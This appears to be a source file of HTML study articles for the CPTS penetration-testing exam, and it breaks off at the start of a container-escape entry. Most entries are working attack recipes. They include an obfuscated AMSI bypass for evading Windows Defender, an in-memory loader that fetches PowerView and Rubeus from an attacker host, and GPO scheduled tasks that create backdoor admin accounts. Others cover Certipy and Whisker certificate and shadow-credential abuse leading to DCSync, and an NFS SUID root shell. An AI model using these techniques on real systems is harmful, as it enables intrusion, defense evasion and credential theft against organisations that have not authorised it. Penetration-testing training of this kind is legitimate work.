<strong>Important:</strong> You cannot relay a hash back to the machine it came from (same-host relay). You need at least 2 machines — victim authenticates to you, you relay to a different machine.
</div>

<h2 id="tips">Defense & Exam Tips</h2>
<ul>
<li>Enable SMB signing on all machines to block relay (DCs do this by default)</li>
<li>Disable LLMNR via GPO: <em>Computer Config → Admin Templates → Network → DNS Client → Turn off multicast</em></li>
<li>For CPTS exam: this attack works best in the initial foothold phase on internal networks</li>
<li>Combine with <code>PetitPotam</code> or <code>PrinterBug</code> to <strong>force</strong> DC authentication rather than waiting for organic traffic</li>
<li>Check if Responder is already running before starting: <code>ps aux | grep responder</code></li>
</ul>`,
  },
  {
    slug: "amsi-bypass",
    title: "AMSI Bypass Techniques (2026)",
    category: "Evasion",
    summary: "Working PowerShell AMSI patches, memory patching via reflection, constrained language mode bypass, and loading offensive tools without triggering Windows Defender.",
    toc: [
      { anchor: "what-is-amsi", label: "What AMSI Does" },
      { anchor: "memory-patch", label: "Memory Patch (amsi.dll)" },
      { anchor: "reflection", label: "Reflection-Based Bypass" },
      { anchor: "clm-bypass", label: "CLM Bypass" },
      { anchor: "loader", label: "In-Memory Loader Pattern" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="what-is-amsi">What AMSI Does</h2>
<p>AMSI (Antimalware Scan Interface) hooks into PowerShell, VBScript, JScript, and other script engines. It passes script content to AV before execution. Windows Defender uses AMSI to block known malicious scripts. Bypassing AMSI means patching the <code>amsi.dll</code> <code>AmsiScanBuffer</code> function to always return "clean."</p>

<h2 id="memory-patch">Memory Patch (Direct)</h2>
<pre><code># Classic AmsiScanBuffer patch — sets return value to AMSI_RESULT_CLEAN
# Obfuscated to avoid detection — concatenate strings at runtime

$a = 'Ams'; $b = 'iSca'; $c = 'nBuf'; $d = 'fer'
$AmsiFunc = $a + $b + $c + $d

Add-Type -MemberDefinition @"
  [DllImport("kernel32")]
  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32")]
  public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name WinAPI -Namespace System
$hModule = [WinAPI]::LoadLibrary("amsi.dll")
$pAddr = [WinAPI]::GetProcAddress($hModule, $AmsiFunc)
$oldProt = 0
[WinAPI]::VirtualProtect($pAddr, [uint32]5, 0x40, [ref]$oldProt) | Out-Null
$patch = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $pAddr, 6)</code></pre>

<h2 id="reflection">Reflection-Based Bypass (simpler)</h2>
<pre><code># Targets amsiInitFailed field directly
# Split strings to evade signature detection
$a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)</code></pre>

<div class="warn-box">
<strong>Note:</strong> These exact strings are flagged by Defender. Obfuscate strings (base64, reverse, concat) before execution. Also note that modern Windows builds with CFG (Control Flow Guard) enabled can break AmsiScanBuffer memory patches; consider reflection or CLM bypasses.
</div>

<h2 id="clm-bypass">Constrained Language Mode Bypass</h2>
<pre><code># Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass via PSv2 (if available)
powershell -version 2

# Bypass via custom runspace
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$rs.SessionStateProxy.LanguageMode = 'FullLanguage'
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript('whoami').Invoke()</code></pre>

<h2 id="loader">In-Memory Loader Pattern</h2>
<pre><code># Download and execute without touching disk
# First: bypass AMSI (above), then:

# Download to memory and execute (IEX)
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')

# Or via reflection (avoids IEX detection)
$bytes = (New-Object Net.WebClient).DownloadData('http://KALI_IP/Rubeus.exe')
$asm = [System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main(@("kerberoast"))</code></pre>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>Always check if AMSI is the problem: <code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</code> — if this errors, AMSI is blocking even this</li>
<li>Use base64 encoded commands to get past initial filters: <code>powershell -enc &lt;b64&gt;</code></li>
<li>For CPTS exam environment: Defender may already be disabled on lab machines — test first before wasting time on bypass</li>
<li>Tools like <code>Invoke-Obfuscation</code> and <code>AMSI.fail</code> website generate fresh bypasses automatically</li>
<li>If PowerShell is fully blocked, try <code>cmd.exe</code> with WMIC, certutil, or BITSAdmin for download/execute</li>
</ul>`,
  },
  {
    slug: "gpo-abuse",
    title: "GPO Abuse for Persistence",
    category: "Active Directory",
    summary: "Modifying Group Policy Objects with GenericWrite — scheduled tasks, startup scripts, registry keys, and immediate policy push for lateral movement and persistence.",
    toc: [
      { anchor: "discovery", label: "GPO Discovery" },
      { anchor: "abusing-write", label: "Abusing GPO Write Rights" },
      { anchor: "scheduled-task", label: "Scheduled Task via GPO" },
      { anchor: "startup-script", label: "Startup Script via GPO" },
      { anchor: "immediate", label: "Forcing Policy Application" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="discovery">GPO Discovery</h2>
<pre><code># Find GPOs where your user/group has write rights
# Primary method: BloodHound — look for GenericWrite, WriteDACL edges to GPO nodes
# Right-click any GPO node → "Shortest Paths to Here from Owned"

# PowerView (modern syntax — use Get-DomainGPO not Get-NetGPO)
Get-DomainGPO -Properties DisplayName,Name | ForEach-Object {
  $gpo = $_
  Get-DomainObjectAcl -Identity $gpo.Name -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match 'GenericWrite|WriteDacl|WriteProperty' -and
    $_.SecurityIdentifier -ne 'S-1-5-18'
  } | Select-Object @{N='GPO';E={$gpo.DisplayName}}, SecurityIdentifier, ActiveDirectoryRights
}

# Quick check on a specific GPO GUID
Get-DomainObjectAcl -Identity "GPO-GUID" -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match 'Write'
}

# Check which OUs (and machines) a GPO applies to
Get-DomainOU -GPLink "GPO-GUID" | Select-Object distinguishedname</code></pre>

<h2 id="abusing-write">Abusing GPO Write Rights</h2>
<p>If BloodHound shows <code>GenericWrite</code> on a GPO that applies to machines you want to compromise, you can modify the GPO to run arbitrary code as SYSTEM on those machines.</p>
<pre><code># Using SharpGPOAbuse (from Windows)
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hacker --GPOName "Vulnerable GPO"

# Add a computer or user task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" --Arguments "/c C:\Windows\Temp\shell.exe" --GPOName "Vulnerable GPO"

# pygpoabuse (from Kali Linux — https://github.com/Hackndo/pyGPOAbuse)
pygpoabuse CORP.LOCAL/hacker:'Pass123!' -gpo-id "<GPO_GUID>" \
  -command "net user backdoor Pass123! /add && net localgroup administrators backdoor /add"</code></pre>

<h2 id="scheduled-task">Scheduled Task via GPO (Manual)</h2>
<pre><code># Locate GPO files on SYSVOL
\\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GPO-GUID}\\Machine\\Preferences\\ScheduledTasks

# Create ScheduledTasks.xml:
&lt;ScheduledTasks clsid="..."&gt;
  &lt;ImmediateTaskV2 clsid="..." name="Backdoor" image="0" changed="2024-01-01 00:00:00" uid="..."&gt;
    &lt;Properties action="C" name="Backdoor" runAs="NT AUTHORITY\SYSTEM" logonType="S4U"&gt;
      &lt;Task version="1.3"&gt;
        &lt;Actions&gt;
          &lt;Exec&gt;
            &lt;Command&gt;cmd.exe&lt;/Command&gt;
            &lt;Arguments&gt;/c net user hacker Pass123! /add&lt;/Arguments&gt;
          &lt;/Exec&gt;
        &lt;/Actions&gt;
      &lt;/Task&gt;
    &lt;/Properties&gt;
  &lt;/ImmediateTaskV2&gt;
&lt;/ScheduledTasks&gt;</code></pre>

<h2 id="immediate">Forcing Policy Application</h2>
<pre><code># On target machine (if you have code execution):
gpupdate /force
# Policy applies immediately — scheduled task runs as SYSTEM

# Remotely trigger policy update via WMI/PsExec:
Invoke-WmiMethod -ComputerName TARGET -Class win32_process -Name create -ArgumentList "gpupdate /force"</code></pre>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>GPO modifications only affect machines/users the GPO is linked to — verify the OU/site/domain link</li>
<li>Use BloodHound's GPO node view to see which OUs (and thus which computers) are affected</li>
<li>The <code>gpupdate /force</code> command requires local execution — use a shell or WMI to trigger remotely</li>
<li>GPO changes are logged in Security event logs — use <code>ImmediateTaskV2</code> for a one-shot task that self-deletes</li>
<li>Check <code>SYSVOL</code> permissions first — you need write access to the GPO folder path, not just the AD object</li>
</ul>`,
  },
  {
    slug: "sysreptor",
    title: "SysReptor Complete Setup",
    category: "Tools & Setup",
    summary: "Docker install, CPTS finding templates, CVSS 3.1 calculator integration, screenshot embedding, and professional PDF export pipeline for penetration test reporting.",
    toc: [
      { anchor: "install", label: "Installation" },
      { anchor: "templates", label: "CPTS Finding Templates" },
      { anchor: "workflow", label: "Reporting Workflow" },
      { anchor: "cvss", label: "CVSS Integration" },
      { anchor: "export", label: "PDF Export" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="install">Installation</h2>
<pre><code># Requirements: Docker + Docker Compose
sudo apt install docker.io docker-compose-plugin -y

# Clone SysReptor
git clone https://github.com/Syslifters/sysreptor.git
cd sysreptor/deploy

# Configure
cp app.env.example app.env
nano app.env  # Set DJANGO_SECRET_KEY to random 64-char string

# Start
docker compose up -d

# Access at http://localhost:8000
# Default admin: admin / admin (change immediately!)

# Create initial superuser if needed
docker compose exec app python manage.py createsuperuser</code></pre>

<h2 id="templates">CPTS Finding Templates</h2>
<p>SysReptor ships with built-in templates. You can also create and import custom finding templates via the GUI or the <code>reptor</code> CLI tool:</p>
<pre><code># Install the reptor CLI companion
pip install reptor

# Push a finding note from the CLI (reptor note subcommand)
reptor --server http://localhost:8000 --token YOUR_API_TOKEN note

# Upload files (evidence, screenshots) from command line
reptor --server http://localhost:8000 --token YOUR_API_TOKEN upload file.png

# Import custom templates via GUI:
# Admin → Design → Templates → Import (upload a .tar.gz template pack)

# To create a template: Admin → Design → Templates → New Template</code></pre>
<p>Key finding templates to have ready:</p>
<ul>
<li>SQL Injection (CVSS 9.8 pre-filled)</li>
<li>SMB Null Session</li>
<li>Kerberoastable Service Account</li>
<li>AS-REP Roasting</li>
<li>DCSync Rights Misconfiguration</li>
<li>Pass-the-Hash</li>
<li>Weak Password Policy</li>
<li>ADCS ESC1/ESC8 template</li>
</ul>

<h2 id="workflow">Reporting Workflow</h2>
<pre><code># 1. Create new pentest project
#    Projects → New → "CPTS Exam" → Set client, scope, dates

# 2. Add findings as you discover them during exam
#    Findings → New Finding → Select template → Fill details

# 3. For each finding, document:
#    - Title, Severity (Critical/High/Medium/Low/Info)
#    - CVSS 3.1 Vector + Score
#    - Affected Host(s)
#    - Description (what/why vulnerable)
#    - PoC Steps (numbered, with screenshots)
#    - Business Impact
#    - Remediation Steps

# 4. Add screenshots inline
#    Paste into finding body — auto-uploads to server

# 5. Executive Summary (last)
#    Report → Executive Summary → Add overall assessment</code></pre>

<h2 id="cvss">CVSS Integration</h2>
<p>SysReptor has a built-in CVSS 3.1 calculator. Click the CVSS field in any finding to open the interactive calculator. Key vectors for common CPTS findings:</p>
<table class="data-table">
<tr><th>Finding Type</th><th>Typical CVSS</th><th>Vector</th></tr>
<tr><td>RCE via RFI/LFI</td><td>9.8 Critical</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</td></tr>
<tr><td>SQLi (auth bypass)</td><td>9.8 Critical</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</td></tr>
<tr><td>Kerberoasting</td><td>8.8 High</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</td></tr>
<tr><td>SMB Null Session</td><td>5.3 Medium</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</td></tr>
<tr><td>Weak Local Admin</td><td>7.8 High</td><td>AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</td></tr>
</table>

<h2 id="export">PDF Export</h2>
<pre><code># Export from GUI
# Report → Generate PDF → Download

# Via CLI
reptor --server http://localhost:8000 --token TOKEN \\
  pdf --project PROJECT_ID --output report.pdf

# Test your PDF template BEFORE exam:
# Check page breaks, headers, code block formatting, screenshot sizing</code></pre>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>Set up SysReptor on exam day <strong>before starting exploitation</strong> — don't wait until day 8</li>
<li>Take and embed screenshots immediately when exploiting — don't rely on terminal history</li>
<li>Use the <code>reptor</code> CLI to push notes directly from Kali without switching windows</li>
<li>The CPTS exam graders read the report carefully — 5 well-documented findings beat 10 sloppy ones</li>
<li>Test the PDF export the day before — some template CSS breaks on specific Docker versions</li>
</ul>`,
  },
  {
    slug: "htb-mappings",
    title: "HTB Machines → CPTS Modules",
    category: "Tools & Setup",
    summary: "Curated list of 30+ HackTheBox machines mapped to specific CPTS exam objectives — ordered by difficulty and topic coverage to maximize study efficiency.",
    toc: [
      { anchor: "fundamentals", label: "Fundamentals & Enumeration" },
      { anchor: "web", label: "Web Application Attacks" },
      { anchor: "ad", label: "Active Directory" },
      { anchor: "privesc", label: "Privilege Escalation" },
      { anchor: "strategy", label: "Study Strategy" },
    ],
    content: `
<h2 id="fundamentals">Fundamentals & Enumeration</h2>
<table class="data-table">
<tr><th>Machine</th><th>OS</th><th>CPTS Modules</th><th>Key Concepts</th></tr>
<tr><td>Lame</td><td>Linux</td><td>Nmap, Shells</td><td>Samba exploit, basic enumeration</td></tr>
<tr><td>Legacy</td><td>Windows</td><td>Nmap, Common Services</td><td>MS08-067, SMB exploitation</td></tr>
<tr><td>Blue</td><td>Windows</td><td>Nmap, Exploitation</td><td>MS17-010 (EternalBlue)</td></tr>
<tr><td>Nibbles</td><td>Linux</td><td>Web Info Gathering, Footprinting</td><td>Web app enum, CMS exploitation</td></tr>
<tr><td>Keeper</td><td>Linux</td><td>Footprinting, Password Attacks</td><td>Default creds, KeePass exploitation</td></tr>
</table>

<h2 id="web">Web Application Attacks</h2>
<table class="data-table">
<tr><th>Machine</th><th>OS</th><th>CPTS Modules</th><th>Key Concepts</th></tr>
<tr><td>Poison</td><td>Linux</td><td>File Inclusion, Shells</td><td>LFI → RCE, log poisoning</td></tr>
<tr><td>Magic</td><td>Linux</td><td>File Upload</td><td>MIME bypass, PHP webshell upload</td></tr>
<tr><td>Bolt</td><td>Linux</td><td>SQLi, SQLMap</td><td>Server-side template injection, credential reuse</td></tr>
<tr><td>Horizontall</td><td>Linux</td><td>Ffuf, Web Attacks</td><td>API subdomain, Strapi RCE</td></tr>
<tr><td>Bashed</td><td>Linux</td><td>Footprinting, PrivEsc</td><td>Web discovery, sudo privesc</td></tr>
<tr><td>Optimum</td><td>Windows</td><td>Common Apps</td><td>HFS RCE, Windows privesc</td></tr>
<tr><td>Bounty</td><td>Windows</td><td>File Upload</td><td>ASPX upload bypass, SeImpersonate</td></tr>
</table>

<h2 id="ad">Active Directory</h2>
<table class="data-table">
<tr><th>Machine</th><th>OS</th><th>CPTS Modules</th><th>Key Concepts</th></tr>
<tr><td>Forest</td><td>Windows</td><td>AD Enum, AD Attacks</td><td>AS-REP Roasting, DCSync, ExchangeWindows Permissions ACL</td></tr>
<tr><td>Blackfield</td><td>Windows</td><td>AD Attacks, ACL Abuse</td><td>AS-REP Roast, ForceChangePassword, DCSync</td></tr>
<tr><td>Monteverde</td><td>Windows</td><td>AD Enum, Password Attacks</td><td>Azure AD Connect, credential reuse</td></tr>
<tr><td>Cascade</td><td>Windows</td><td>AD Enum, AD Attacks</td><td>LDAP enum, AD recycle bin, .NET reversing</td></tr>
<tr><td>Sauna</td><td>Windows</td><td>AD Enum, AD Attacks</td><td>Kerbrute user enum, AS-REP Roast, DCSync</td></tr>
<tr><td>Active</td><td>Windows</td><td>AD Enum, Kerberoasting</td><td>GPP password, Kerberoasting DA</td></tr>
<tr><td>Return</td><td>Windows</td><td>AD Enum, Common Services</td><td>LDAP credential leak, Server Operators group</td></tr>
<tr><td>Escape</td><td>Windows</td><td>AD Attacks, ADCS</td><td>MSSQL hash capture, ADCS ESC1</td></tr>
<tr><td>Manager</td><td>Windows</td><td>ADCS Attacks</td><td>ADCS ESC7, Certipy, LDAP enum</td></tr>
<tr><td>Support</td><td>Windows</td><td>AD Enum, RBCD</td><td>SMB info leak, RBCD attack</td></tr>
</table>

<h2 id="privesc">Privilege Escalation</h2>
<table class="data-table">
<tr><th>Machine</th><th>OS</th><th>CPTS Modules</th><th>Key Concepts</th></tr>
<tr><td>Beep</td><td>Linux</td><td>Linux PrivEsc, Common Services</td><td>FreePBX/Elastix LFI → RCE, Webmin exploit, multiple privesc paths (sudo nmap, sudo -l)</td></tr>
<tr><td>Sunday</td><td>Solaris</td><td>Linux PrivEsc, Password Attacks</td><td>Finger enumeration, shadow hash cracking, sudo wget</td></tr>
<tr><td>Valentine</td><td>Linux</td><td>Linux PrivEsc</td><td>Heartbleed, tmux session hijack</td></tr>
<tr><td>Shocker</td><td>Linux</td><td>Linux PrivEsc</td><td>Shellshock, sudo perl</td></tr>
<tr><td>Arctic</td><td>Windows</td><td>Windows PrivEsc</td><td>ColdFusion exploit, JuicyPotato</td></tr>
<tr><td>Bastard</td><td>Windows</td><td>Windows PrivEsc, Common Apps</td><td>Drupal RCE, JuicyPotato</td></tr>
</table>

<h2 id="strategy">Study Strategy</h2>
<div class="tip-box">
<strong>Recommended Order:</strong> Lame → Blue → Bashed → Nibbles (basic skills) → Poison → Magic → Bounty (web) → Sauna → Forest → Active (AD basics) → Blackfield → Escape → Manager (AD advanced)
</div>
<ul>
<li>Don't read walkthroughs until you've spent 2+ hours on a machine</li>
<li>After completing, read at least 2 public writeups to see alternate approaches</li>
<li>AD machines (Forest, Blackfield, Sauna) are the closest to actual CPTS exam feel</li>
<li>Manager and Escape specifically practice ADCS — high value for CPTS</li>
<li>Retire machines rotate — check HTB retired list for machine availability</li>
</ul>`,
  },
  {
    slug: "certipy",
    title: "Certipy Complete Guide",
    category: "Active Directory",
    summary: "Full Certipy workflow covering all subcommands — find, req, auth, shadow, relay, forge — with real-world output examples and PKINIT authentication.",
    toc: [
      { anchor: "install", label: "Installation" },
      { anchor: "find", label: "certipy find" },
      { anchor: "req", label: "certipy req" },
      { anchor: "auth", label: "certipy auth" },
      { anchor: "shadow", label: "certipy shadow" },
      { anchor: "relay", label: "certipy relay" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="install">Installation</h2>
<pre><code>pip3 install certipy-ad
# Or from source for latest version:
git clone https://github.com/ly4k/Certipy && cd Certipy
pip3 install .

# Verify
certipy --version</code></pre>

<h2 id="find">certipy find — Enumerate AD CS</h2>
<pre><code># Find all CA info and vulnerable templates
certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5

# Show only vulnerable findings (cleaner output)
certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5 -vulnerable -stdout

# Save output to files (default: saves .json + .txt in current directory)
certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5
# → creates corp.local_Certipy.json and corp.local_Certipy.txt

# Key output fields to look for:
# - "Enabled": true (template must be enabled)
# - "Client Authentication": true (EKU must support auth)
# - "Enrollee Supplies Subject": true (ESC1)
# - "[!] Vulnerabilities" section = confirmed ESC</code></pre>

<h2 id="req">certipy req — Request Certificate</h2>
<pre><code># Basic request (use a template you're enrolled in)
certipy req -u 'jdoe@corp.local' -p 'Password1!' \\
  -ca 'CORP-CA' -template 'User' -dc-ip 10.10.10.5

# ESC1 — supply arbitrary UPN in SAN
certipy req -u 'jdoe@corp.local' -p 'Password1!' \\
  -ca 'CORP-CA' -template 'VulnTemplate' \\
  -upn 'administrator@corp.local' -dc-ip 10.10.10.5
# Output: administrator.pfx

# Using NTLM hash instead of password
certipy req -u 'jdoe@corp.local' -hashes :aad3b435...:<ntlm_hash> \\
  -ca 'CORP-CA' -template 'User' -dc-ip 10.10.10.5

# Request for specific DNS name (some ESC variants)
certipy req -u 'jdoe@corp.local' -p 'Password1!' \\
  -ca 'CORP-CA' -template 'VulnTemplate' \\
  -dns 'dc01.corp.local' -dc-ip 10.10.10.5</code></pre>

<h2 id="auth">certipy auth — Authenticate with Certificate</h2>
<pre><code># PKINIT authentication → get TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5

# Output:
# [*] Got hash for 'administrator@corp.local': aad3b435b51404ee:8f617b...
# [*] Saved TGT to 'administrator.ccache'

# Use TGT for Kerberos operations
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Use NT hash for PTH
impacket-wmiexec corp.local/administrator@10.10.10.5 -hashes :8f617b...</code></pre>

<h2 id="shadow">certipy shadow — Shadow Credentials</h2>
<pre><code># Add shadow credentials to a user/computer you have write access to
certipy shadow auto -u 'jdoe@corp.local' -p 'Password1!' \\
  -account 'targetuser' -dc-ip 10.10.10.5
# Output: NT hash of targetuser

# Manual steps:
# 1. Add key credentials
certipy shadow add -u 'jdoe@corp.local' -p 'Password1!' \\
  -account 'targetuser' -dc-ip 10.10.10.5

# 2. Authenticate with generated cert
certipy auth -pfx targetuser.pfx -dc-ip 10.10.10.5

# 3. Clean up (remove the key credential)
certipy shadow remove -u 'jdoe@corp.local' -p 'Password1!' \\
  -account 'targetuser' -device-id &lt;UUID from add step&gt; -dc-ip 10.10.10.5</code></pre>

<h2 id="relay">certipy relay — NTLM Relay to AD CS</h2>
<pre><code># Relay NTLM auth to AD CS web enrollment (ESC8)
# Run alongside Responder (SMB=Off, HTTP=Off)
certipy relay -ca 10.10.10.5 -template DomainController

# Combined with PetitPotam to coerce DC auth:
python3 PetitPotam.py -u 'jdoe' -p 'Password1!' KALI_IP DC_IP

# Output: dc01.pfx → use with certipy auth to get DC hash → DCSync</code></pre>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>Run <code>certipy find -vulnerable -stdout</code> immediately after getting any domain credentials</li>
<li>The pfx file contains both cert and private key — guard it, it's equivalent to a password</li>
<li>If PKINIT fails with <code>KDC_ERR_PADATA_TYPE_NOSUPP</code>, the DC doesn't support PKINIT — try <code>-ldap-shell</code> mode</li>
<li>Use <code>certipy account create</code> to create machine accounts for RBCD without impacket-addcomputer</li>
<li>After exam, revoke any certificates you requested: <code>certipy ca -revoke &lt;serial&gt;</code></li>
</ul>`,
  },
  {
    slug: "shadow-credentials",
    title: "Shadow Credentials Attack",
    category: "Active Directory",
    summary: "msDS-KeyCredentialLink manipulation via Whisker or Certipy — obtaining NT hashes of users and computers without password resets using PKINIT.",
    toc: [
      { anchor: "concept", label: "How Shadow Credentials Work" },
      { anchor: "requirements", label: "Requirements" },
      { anchor: "certipy", label: "Attack with Certipy" },
      { anchor: "whisker", label: "Attack with Whisker (Windows)" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="concept">How Shadow Credentials Work</h2>
<p>Windows supports PKINIT (public key authentication) for Kerberos. The <code>msDS-KeyCredentialLink</code> attribute on a user/computer object stores trusted public keys for certificate-based authentication. If you can write to this attribute (via <code>GenericWrite</code>, <code>WriteProperty</code>, or <code>Owns</code>), you can add your own key pair — then authenticate as that user using PKINIT and extract their NT hash without ever knowing their password.</p>

<h2 id="requirements">Requirements</h2>
<ul>
<li>Write access to <code>msDS-KeyCredentialLink</code> on a user or computer object (BloodHound: <code>GenericWrite</code>, <code>WriteProperty</code>, <code>Owns</code> edges)</li>
<li>Domain functional level 2016+ (PKINIT must be supported)</li>
<li>A Domain Controller running Active Directory Certificate Services is NOT required — PKINIT works without ADCS</li>
</ul>

<h2 id="certipy">Attack with Certipy</h2>
<pre><code># Auto mode — does everything: add key, authenticate, get hash, clean up
certipy shadow auto -u 'jdoe@corp.local' -p 'Password1!' \\
  -account 'targetuser' -dc-ip 10.10.10.5

# Output:
# [*] Targeting user 'targetuser'
# [*] Generating certificate
# [*] Adding Key Credential with device ID 'abc123...'
# [*] Authenticating as 'targetuser' with the certificate
# [*] Got hash for 'targetuser@corp.local': aad3b435b51404ee:e3e3e3...

# Manual — if you need control over each step:
# Step 1: Add your key to the target
certipy shadow add -u 'jdoe@corp.local' -p 'Password1!' \\
  -account 'targetuser' -dc-ip 10.10.10.5
# Saves: targetuser.pfx, targetuser_key.pem, device ID

# Step 2: Authenticate as target using your certificate
certipy auth -pfx targetuser.pfx -dc-ip 10.10.10.5
# Output: NT hash + TGT saved to targetuser.ccache

# Step 3: Clean up — remove the key credential
certipy shadow remove -u 'jdoe@corp.local' -p 'Password1!' \\
  -account 'targetuser' -device-id &lt;UUID&gt; -dc-ip 10.10.10.5</code></pre>

<h2 id="whisker">Attack with Whisker (Windows)</h2>
<pre><code># Whisker — C# tool for Shadow Credentials
# https://github.com/eladshamir/Whisker

# List current key credentials on target
.\Whisker.exe list /target:targetuser /domain:corp.local /dc:DC01

# Add shadow credential
.\Whisker.exe add /target:targetuser /domain:corp.local /dc:DC01 /path:output.pfx /password:certPass123

# Output includes Rubeus command to use the cert:
.\Rubeus.exe asktgt /user:targetuser /certificate:output.pfx \\
  /password:certPass123 /domain:corp.local /dc:DC01 /getcredentials /show

# getcredentials flag extracts NT hash from PAC in TGT</code></pre>

<div class="tip-box">
<strong>Computer Accounts:</strong> Shadow Credentials works on computer accounts too. If you have GenericWrite on a computer object, you can get its NT hash and use it for Silver Ticket or S4U attacks.
</div>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>Shadow Credentials is a stealthy alternative to password reset (ForceChangePassword) — no account lockout, no password change notification</li>
<li>BloodHound edges: <code>GenericWrite</code> on any user/computer → Shadow Credentials attack is viable</li>
<li>Verify the domain supports PKINIT before attempting: <code>certipy find</code> output shows DC cert capabilities</li>
<li>The <code>-account</code> flag accepts the sAMAccountName (e.g., <code>jdoe</code> not <code>jdoe@corp.local</code>)</li>
<li>If PKINIT-based auth fails (DC lacks a KDC certificate), use the auto mode with LDAP shell fallback: <code>certipy shadow auto -ldap-shell -u jdoe@corp.local -p 'Pass' -account targetuser -dc-ip DC_IP</code> — the <code>-ldap-shell</code> flag belongs on <code>shadow auto</code>, not on <code>certipy auth</code></li>
</ul>`,
  },
  {
    slug: "nfs-exploitation",
    title: "NFS Exploitation",
    category: "Infrastructure",
    summary: "NFS share enumeration, no_root_squash UID spoofing for privilege escalation, SUID binary planting, and NFSv3 version fingerprinting techniques.",
    toc: [
      { anchor: "enum", label: "NFS Enumeration" },
      { anchor: "mount", label: "Mounting Shares" },
      { anchor: "no-root-squash", label: "no_root_squash UID Spoofing" },
      { anchor: "suid", label: "SUID Binary Attack" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="enum">NFS Enumeration</h2>
<pre><code># Discover NFS services
nmap -sV -p 111,2049 10.10.10.0/24
nmap -p 111 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.5

# Show exported shares
showmount -e 10.10.10.5
# Output: /share  *(rw,no_root_squash)
#         /home   10.10.10.0/24(ro)

# RPC info
rpcinfo -p 10.10.10.5</code></pre>

<h2 id="mount">Mounting Shares</h2>
<pre><code># Mount NFS share
sudo mkdir /mnt/nfs
sudo mount -t nfs 10.10.10.5:/share /mnt/nfs -o nolock

# List contents
ls -la /mnt/nfs

# Unmount
sudo umount /mnt/nfs</code></pre>

<h2 id="no-root-squash">no_root_squash UID Spoofing</h2>
<p><strong>no_root_squash</strong>: By default, NFS maps remote root (UID 0) to <code>nfsnobody</code> (root squash). When disabled with <code>no_root_squash</code>, the remote root user keeps root privileges on the share. You can spoof any UID.</p>
<pre><code># Check export options (look for no_root_squash)
cat /etc/exports  # if you have local access on server
showmount -e 10.10.10.5  # remote check

# To exploit: create local user with same UID as target file owner
# Example: file owned by UID 1000 on remote
ls -lan /mnt/nfs/  # shows numeric UIDs

# Create local user with matching UID
sudo useradd -u 1000 fakeuser
sudo su fakeuser
# Now you own files that belong to UID 1000 on the share

# For root squash disabled shares — use root directly:
sudo -i
# You ARE UID 0 → no_root_squash gives you root on the share
ls /mnt/nfs/root/.ssh/  # read root's SSH keys!</code></pre>

<h2 id="suid">SUID Binary Attack</h2>
<pre><code># With no_root_squash, plant a SUID binary
# As root on your Kali:
sudo -i
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
ls -la /mnt/nfs/bash
# -rwsr-xr-x 1 root root ... bash

# On target machine (after SSH/shell access):
/mnt/nfs/bash -p
# -p flag preserves SUID — gives root shell!
whoami  # root</code></pre>

<div class="warn-box">
<strong>Requirement:</strong> You need a shell on the target machine AND be able to execute files from the NFS mount. The SUID bit is set on your Kali (UID 0 side) and read from the mounted share on target.
</div>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>Always run <code>showmount -e</code> during enumeration — NFS is commonly missed</li>
<li>World-readable shares (<code>*(ro)</code>) can still expose sensitive files — SSH keys, configs, database passwords</li>
<li>NFSv4 uses numeric UIDs differently — test with <code>-o vers=3</code> mount option if v4 fails</li>
<li>Check <code>/etc/exports</code> if you get a foothold — the <code>no_root_squash</code> option on home directories is a quick privesc</li>
<li>No firewall filtering port 2049? That's NFS — always try <code>showmount</code></li>
</ul>`,
  },
  {
    slug: "container-escape",
    title: "Docker / LXD Container Escape",
    category: "Privilege Escalation",
